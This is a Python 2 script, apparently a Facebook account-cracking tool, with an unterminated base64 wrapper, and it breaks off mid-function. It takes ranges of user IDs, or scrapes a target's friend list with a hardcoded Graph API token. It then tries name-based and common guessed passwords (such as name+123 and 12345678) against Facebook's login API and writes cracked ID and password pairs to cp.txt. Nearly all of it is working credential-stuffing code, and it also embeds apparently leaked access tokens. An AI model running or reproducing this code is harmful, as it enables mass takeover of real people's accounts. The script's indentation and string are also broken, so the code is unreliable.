import base64
a = '#!/usr/bin/python
# coding=utf-8
# -*- coding: utf-8 -*-
# coded by : Tech-Abm 
# https://www.facebook.com/Techabm

try:
    import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests
    from multiprocessing.pool import ThreadPool
    
    from bs4 import BeautifulSoup
    
    import urllib2
    import re

    from multiprocessing import Pool
    from multiprocessing import Process
    import threading
except ImportError:
    os.system("pip2 install requests")
    os.system("pip2 install mechanize")

from requests.exceptions import ConnectionError
bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding("utf8")
os.system('clear')
cnt=0
uid=""
name="" 
lenth=0
allname=""
last=""

start=0
end=0
tokenmy=""
i=0
#main

def main1():
 global header,uid,name,allname,cnt,last,tokenmy,lenth,start,end,i
 part=""
 incr=0
 pswrd=0
 looper=0
 start=0
 singl=' '
 notfound=0
 tokenmy="EAAAAZAw4FxQIBANKHd4PSu2l0OMSyvpV1AMrRejYqmsCg5W1wnbkhldTGQoIM4SqFIzPWROk2RxZCd2a4krnhKgq9WKu0IVZAFZC1fetcRKiSZCYbKh8idgdvPwDTre9subuNAClrfCx0s5UZAecFvTaRfFnJC6XZBIVh2vEySxHf4LkojB62IFbAvETbsMzbUZD"
 chk="0"
 idt=""
 idh = []
 idlast=[]
 getname=""
 getid=""
 url=' '
 khan=""

 i
 splt=""
 uid=""
 name=""
 id=''
 fixpart=""
 end=""
 fixpart=raw_input("\n\nfix part:")
 start=int(raw_input("start="))
 end=int(raw_input("end="))
 cnt=0
 fil=open("cracking.txt","w")
 for k in range(int(start),int(end)):
  fil.write(fixpart+str(k)+"\n")
 fil.close()
 last=""
 uid=""
 start=0
 idlast=""
 bost=1
 a=""
 khan=1
 allname=""
 fullget=""
 notfound=0
 for i in range (int(start),int(end)):
   txtfile=open("cracking.txt","r")
   splt=txtfile.readlines()
   
   uid=splt[i].replace("\n","")
   txtfile.close()
   r=requests.get("https://graph.facebook.com/"+uid+"/?fields=name&access_token=EAAAAZAw4FxQIBANKHd4PSu2l0OMSyvpV1AMrRejYqmsCg5W1wnbkhldTGQoIM4SqFIzPWROk2RxZCd2a4krnhKgq9WKu0IVZAFZC1fetcRKiSZCYbKh8idgdvPwDTre9subuNAClrfCx0s5UZAecFvTaRfFnJC6XZBIVh2vEySxHf4LkojB62IFbAvETbsMzbUZD",headers=header).text
   q= json.loads(r)
   try:
      allname=q["name"]
      if 'name' in allname:
       notfound=1
      else:
       lenth=allname.split()
       if len(lenth)>1:
        name=allname.split(" ")[0]
        last=allname.split(" ")[1]
        notfound=0
       else:
        name=allname
        last=name
        notfound=0
   except:
    notfound=1
   def pascrack2():
       global cnt,uid,allname,name,lenth,start,end
       print("crack %d/%d %s %s"%(i,end-start,uid,name))
       
       passpak=name+"1122"
       q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + passpak + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
       d=json.loads(q)   
       try:
        if 'www.facebook.com' in d['error_msg'] or 'access_token' in d:
			          print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+passpak+"\033[1;91m-⋄-\033[1;97m"+allname)
			          cp=open("cp.txt","a")
			          cp.write(uid+" | "+passpak+"\n")          
			          cp.close()
        else:
                          
			              passpak=name+" "+last.lower()
			              q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + passpak + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
			              d=json.loads(q)   
			              if 'www.facebook.com' in d['error_msg'] or 'access_token' in d:
			                 print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+passpak+"\033[1;91m-⋄-\033[1;97m"+allname)
			                 cp=open("cp.txt","a")
			                 cp.write(uid+" | "+passpak+"\n")
			                 cp.close()                 
			              else:
			              
			                 passpak=name+last.lower()
			                 q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + passpak + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
			                 d=json.loads(q)   
			                 if 'www.facebook.com' in d['error_msg']:
			                  print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+passpak+"\033[1;91m-⋄-\033[1;97m"+allname)
			                  cp=open("cp.txt","a")
			                  cp.write(uid+" | "+passpak+"\n")
			                  cp.close()                 
			                 else:
			                  passpak=name+"123"
			                  q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + passpak + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
			                  d=json.loads(q)   
			                  if 'www.facebook.com' in d['error_msg'] or 'access_token' in d:
			                   print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+passpak+"\033[1;91m-⋄-\033[1;97m"+allname)
			                   cp=open("cp.txt","a")
			                   cp.write(uid+" | "+passpak+"\n")          
			                   cp.close()                   
			                  else:
			                   passpak=name+"786"
			                  q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + passpak + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
			                  d=json.loads(q)   
			                  if 'www.facebook.com' in d['error_msg'] or 'access_token' in d:
			                   print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+passpak+"\033[1;91m-⋄-\033[1;97m"+allname)
			                   cp=open("cp.txt","a")
			                   cp.write(uid+" | "+passpak+"\n")        
			                   cp.close()                  
			                  else:
			                   passpak=last.lower()+"123"
			                   q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + passpak + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
			                   d=json.loads(q)   
			                   if 'www.facebook.com' in d['error_msg'] or 'access_token' in d:
			                    print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+passpak+"\033[1;91m-⋄-\033[1;97m"+allname)
			                    cp=open("cp.txt","a")
			                    cp.write(uid+" | "+passpak+"\n")               
			                    cp.close()        
			                   else:
			                    passpak=last.lower()+"786"
			                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + passpak + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
			                    d=json.loads(q)   
			                    if 'www.facebook.com' in d['error_msg'] or 'access_token' in d:
			                     print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+passpak+"\033[1;91m-⋄-\033[1;97m"+allname)
			                     cp=open("cp.txt","a")
			                     cp.write(uid+" | "+passpak+"\n")                  
			                     cp.close()
			                    else:
			                      passpak="786786"
			                      q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + passpak + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
			                      d=json.loads(q)   
			                      if 'www.facebook.com' in d['error_msg'] or 'access_token' in d:
			                       print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+passpak+"\033[1;91m-⋄-\033[1;97m"+allname)
			                       cp=open("cp.txt","a")
			                       cp.write(uid+" | "+passpak+"\n")           
			                       cp.close()
			                      else:
			                        passpak="12345678"
			                        q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + passpak + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
			                        d=json.loads(q)   
			                        if 'www.facebook.com' in d['error_msg'] or 'access_token' in d:
			                         print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+passpak+"\033[1;91m-⋄-\033[1;97m"+allname)
			                         cp=open("cp.txt","a")    
			                         cp.write(uid+" | "+passpak+"\n")                         
			                         cp.close()
			                        else:
			                          passpak="1122334455"
			                          q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + passpak + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
			                          d=json.loads(q)   
			                          if 'www.facebook.com' in d['error_msg'] or 'access_token' in d:
			                           print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+passpak+"\033[1;91m-⋄-\033[1;97m"+allname)
			                           cp=open("cp.txt","a")
			                           cp.write(uid+" | "+passpak+"\n")                         
			                           cp.close()
       except KeyError:
           print("not crack")
   def pascrack1():
       global cnt,uid,allname,name,lenth,satart,end
       print("crack %d/%d %s %s"%(i,end-start,uid,name))
       
       passpak="203040"
       q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + passpak + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
       d=json.loads(q)   
       try:
        if 'www.facebook.com' in d['error_msg'] or 'access_token' in d:
			          print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+passpak+"\033[1;91m-⋄-\033[1;97m"+allname)
			          cp=open("cp.txt","a")
			          cp.write(uid+" | "+passpak+"\n")          
			          cp.close()
        else:
                          
			              passpak=name+"123"
			              q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + passpak + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
			              d=json.loads(q)   
			              if 'www.facebook.com' in d['error_msg'] or 'access_token' in d:
			                 print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+passpak+"\033[1;91m-⋄-\033[1;97m"+allname)
			                 cp=open("cp.txt","a")
			                 cp.write(uid+" | "+passpak+"\n")
			                 cp.close()                 
			              else:
			              
			                 passpak=name+"1234"
			                 q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + passpak + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
			                 d=json.loads(q)   
			                 if 'www.facebook.com' in d['error_msg']:
			                  print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+passpak+"\033[1;91m-⋄-\033[1;97m"+allname)
			                  cp=open("cp.txt","a")
			                  cp.write(uid+" | "+passpak+"\n")
			                  cp.close()                 
			                 else:
			                  passpak=name+"12345"
			                  q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + passpak + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
			                  d=json.loads(q)   
			                  if 'www.facebook.com' in d['error_msg'] or 'access_token' in d:
			                   print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+passpak+"\033[1;91m-⋄-\033[1;97m"+allname)
			                   cp=open("cp.txt","a")
			                   cp.write(uid+" | "+passpak+"\n")          
			                   cp.close()                   
			                  else:
			                   passpak=name+"786"
			                  q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + passpak + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
			                  d=json.loads(q)   
			                  if 'www.facebook.com' in d['error_msg'] or 'access_token' in d:
			                   print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+passpak+"\033[1;91m-⋄-\033[1;97m"+allname)
			                   cp=open("cp.txt","a")
			                   cp.write(uid+" | "+passpak+"\n")        
			                   cp.close()                  
			                  else:
			                   passpak="12345678"
			                   q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + passpak + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
			                   d=json.loads(q)   
			                   if 'www.facebook.com' in d['error_msg'] or 'access_token' in d:
			                    print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+passpak+"\033[1;91m-⋄-\033[1;97m"+allname)
			                    cp=open("cp.txt","a")
			                    cp.write(uid+" | "+passpak+"\n")               
			                    cp.close()        
			                   else:
			                    passpak="1122334455"
			                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + passpak + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
			                    d=json.loads(q)   
			                    if 'www.facebook.com' in d['error_msg'] or 'access_token' in d:
			                     print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+passpak+"\033[1;91m-⋄-\033[1;97m"+allname)
			                     cp=open("cp.txt","a")
			                     cp.write(uid+" | "+passpak+"\n")                  
			                     cp.close()
			                    else:
			                      passpak="786786"
			                      q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + passpak + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
			                      d=json.loads(q)   
			                      if 'www.facebook.com' in d['error_msg'] or 'access_token' in d:
			                       print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+passpak+"\033[1;91m-⋄-\033[1;97m"+allname)
			                       cp=open("cp.txt","a")
			                       cp.write(uid+" | "+passpak+"\n")           
			                       cp.close()
			                      else:
			                        passpak="123456"
			                        q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + passpak + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
			                        d=json.loads(q)   
			                        if 'www.facebook.com' in d['error_msg'] or 'access_token' in d:
			                         print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+passpak+"\033[1;91m-⋄-\033[1;97m"+allname)
			                         cp=open("cp.txt","a")    
			                         cp.write(uid+" | "+passpak+"\n")                         
			                         cp.close()
			                        else:
			                          passpak="8090100"
			                          q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + passpak + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
			                          d=json.loads(q)   
			                          if 'www.facebook.com' in d['error_msg'] or 'access_token' in d:
			                           print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+passpak+"\033[1;91m-⋄-\033[1;97m"+allname)
			                           cp=open("cp.txt","a")
			                           cp.write(uid+" | "+passpak+"\n")                         
			                           cp.close()
  
       except KeyError:
          print("not crack")
   if(notfound==1):
     notfound=0
     
   else:
    if(len(lenth)==1):
     
     p1=Process(target=pascrack1)
     p1.start()     
    else:
     
     p=Process(target=pascrack2)
     p.start()
#--------------------------------------------------------
#----------------------------------------------------------
#---------------------------------------------------------
#-----------------------------
#-----------------------------
#-----------------------------
#-----------------------------
#-----------------------------
#-----------------------------
#-----------------------------
#-----------------------------
count=0
filelenth=[]    
khtm=0
lenth=""
i=0
filelenth=""
uid=""
name=""
def main2():
 global header,uid,name,allname,cnt,last,tokenmy,lenth,start,end,i,filelenth,count,khtm
 part=""
 incr=0
 pswrd=0
 looper=0
 start=0
 khtm=0
 singl=' '
 notfound=0
 tokenmy="EAAAAZAw4FxQIBANKHd4PSu2l0OMSyvpV1AMrRejYqmsCg5W1wnbkhldTGQoIM4SqFIzPWROk2RxZCd2a4krnhKgq9WKu0IVZAFZC1fetcRKiSZCYbKh8idgdvPwDTre9subuNAClrfCx0s5UZAecFvTaRfFnJC6XZBIVh2vEySxHf4LkojB62IFbAvETbsMzbUZD"
 chk="0"
 idt=""
 idh = []
 idlast=[]
 filelenth=[]
 getname=""
 getid=""
 url=' '
 khan=""

 global i
 splt=""
 uid=""
 name=""
 id=''
 fixpart=""
 end=""
 fixpart=raw_input("\n\nEnter Link of target profile post:  ")
 #start=int(raw_input("start="))
 #end=int(raw_input("end="))
 cnt=0
 for k in range(0,1):
  #for k in range(int(start),int(end)+1):
  #uid=fixpart
  splt=fixpart.split(".com/")[-1]
  uid=splt.split("/posts")[0]
  try:
   r = requests.get("https://graph.facebook.com/"+uid+"/friends?access_token=EAAAAZAw4FxQIBANKHd4PSu2l0OMSyvpV1AMrRejYqmsCg5W1wnbkhldTGQoIM4SqFIzPWROk2RxZCd2a4krnhKgq9WKu0IVZAFZC1fetcRKiSZCYbKh8idgdvPwDTre9subuNAClrfCx0s5UZAecFvTaRfFnJC6XZBIVh2vEySxHf4LkojB62IFbAvETbsMzbUZD", headers=header).text
   z = json.loads(r)
   
   for i in z["data"]:
    user=i['id']
    na=i['name']
    filelenth.append(user+"|"+na)
  except:
    faltu=0
  sys.stdout.write(" searching frndlist ..."+str(len(filelenth))+"\r")
  sys.stdout.flush()
 last=""
 uid=""
 start=0
 idlast=""
 bost=1
 a=""
 khan=1
 allname=""
 fullget=""
 notfound=0
 def readlist():
   os.system('clear')
   
   global notfound,i,uid,name,lenth,filelenth,last
   notfound=0
   for i in range(len(filelenth)):
    uid,name=filelenth[i].split("|")
    r=requests.get("https://graph.facebook.com/"+uid+"/?fields=name&access_token=EAAAAZAw4FxQIBANKHd4PSu2l0OMSyvpV1AMrRejYqmsCg5W1wnbkhldTGQoIM4SqFIzPWROk2RxZCd2a4krnhKgq9WKu0IVZAFZC1fetcRKiSZCYbKh8idgdvPwDTre9subuNAClrfCx0s5UZAecFvTaRfFnJC6XZBIVh2vEySxHf4LkojB62IFbAvETbsMzbUZD",headers=header).text
    q= json.loads(r)
    try:  
      allname=name
      lenth=allname.split()
      if len(lenth)>1:
       name=allname.split(" ")[0]
       last=allname.split(" ")[1]
       notfound=0
      else:
       name=allname
       last=name
       notfound=0
    except:
      notfound=1
    def pascrack2():
       global cnt,uid,allname,name,lenth,start,end,filelenth
       
       sys.stdout.write(" crack %s/%s %s %s \r"%(str(i),str(len(filelenth)),uid,name))
       sys.stdout.flush() 
       passpak=name+"1122"
       q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + passpak + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
       d=json.loads(q)   
       try:
        if 'www.facebook.com' in d['error_msg'] or 'access_token' in d:
			          print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+passpak+"\033[1;91m-⋄-\033[1;97m"+allname)
			          cp=open("cp.txt","a")
			          cp.write(uid+" | "+passpak+"\n")          
			          cp.close()
        else:
                          
			              passpak=name+" "+last.lower()
			              q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + passpak + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
			              d=json.loads(q)   
			              if 'www.facebook.com' in d['error_msg'] or 'access_token' in d:
			                 print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+passpak+"\033[1;91m-⋄-\033[1;97m"+allname)
			                 cp=open("cp.txt","a")
			                 cp.write(uid+" | "+passpak+"\n")
			                 cp.close()                 
			              else:
			              
			                 passpak=name+last.lower()
			                 q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + passpak + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
			                 d=json.loads(q)   
			                 if 'www.facebook.com' in d['error_msg']:
			                  print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+passpak+"\033[1;91m-⋄-\033[1;97m"+allname)
			                  cp=open("cp.txt","a")
			                  cp.write(uid+" | "+passpak+"\n")
			                  cp.close()                 
			                 else:
			                  passpak=name+"123"
			                  q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + passpak + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
			                  d=json.loads(q)   
			                  if 'www.facebook.com' in d['error_msg'] or 'access_token' in d:
			                   print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+passpak+"\033[1;91m-⋄-\033[1;97m"+allname)
			                   cp=open("cp.txt","a")
			                   cp.write(uid+" | "+passpak+"\n")          
			                   cp.close()                   
			                  else:
			                   passpak=name+"786"
			                  q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + passpak + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
			                  d=json.loads(q)   
			                  if 'www.facebook.com' in d['error_msg'] or 'access_token' in d:
			                   print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+passpak+"\033[1;91m-⋄-\033[1;97m"+allname)
			                   cp=open("cp.txt","a")
			                   cp.write(uid+" | "+passpak+"\n")        
			                   cp.close()                  
			                  else:
			                   passpak=last.lower()+"123"
			                   q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + passpak + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
			                   d=json.loads(q)   
			                   if 'www.facebook.com' in d['error_msg'] or 'access_token' in d:
			                    print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+passpak+"\033[1;91m-⋄-\033[1;97m"+allname)
			                    cp=open("cp.txt","a")
			                    cp.write(uid+" | "+passpak+"\n")               
			                    cp.close()        
			                   else:
			                    passpak=last.lower()+"786"
			                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + passpak + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
			                    d=json.loads(q)   
			                    if 'www.facebook.com' in d['error_msg'] or 'access_token' in d:
			                     print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+passpak+"\033[1;91m-⋄-\033[1;97m"+allname)
			                     cp=open("cp.txt","a")
			                     cp.write(uid+" | "+passpak+"\n")                  
			                     cp.close()
			                    else:
			                      passpak="786786"
			                      q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + passpak + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
			                      d=json.loads(q)   
			                      if 'www.facebook.com' in d['error_msg'] or 'access_token' in d:
			                       print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+passpak+"\033[1;91m-⋄-\033[1;97m"+allname)
			                       cp=open("cp.txt","a")
			                       cp.write(uid+" | "+passpak+"\n")           
			                       cp.close()
			                      else:
			                        passpak="12345678"
			                        q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + passpak + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
			                        d=json.loads(q)   
			                        if 'www.facebook.com' in d['error_msg'] or 'access_token' in d:
			                         print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+passpak+"\033[1;91m-⋄-\033[1;97m"+allname)
			                         cp=open("cp.txt","a")    
			                         cp.write(uid+" | "+passpak+"\n")                         
			                         cp.close()
			                        else:
			                          passpak="1122334455"
			                          q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + passpak + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
			                          d=json.loads(q)   
			                          if 'www.facebook.com' in d['error_msg'] or 'access_token' in d:
			                           print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+passpak+"\033[1;91m-⋄-\033[1;97m"+allname)
			                           cp=open("cp.txt","a")
			                           cp.write(uid+" | "+passpak+"\n")                         
			                           cp.close()
       except KeyError:
           print("not crack")
    def pascrack1():
       global cnt,uid,allname,name,lenth,satart,end,filelenth
       
       sys.stdout.write(" crack %s/%s %s %s \r"%(str(i),str(len(filelenth)),uid,name))
       sys.stdout.flush() 
       passpak="203040"
       q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + passpak + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
       d=json.loads(q)   
       try:
        if 'www.facebook.com' in d['error_msg'] or 'access_token' in d:
			          print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+passpak+"\033[1;91m-⋄-\033[1;97m"+allname)
			          cp=open("cp.txt","a")
			          cp.write(uid+" | "+passpak+"\n")          
			          cp.close()
        else:
                          
			              passpak=name+"123"
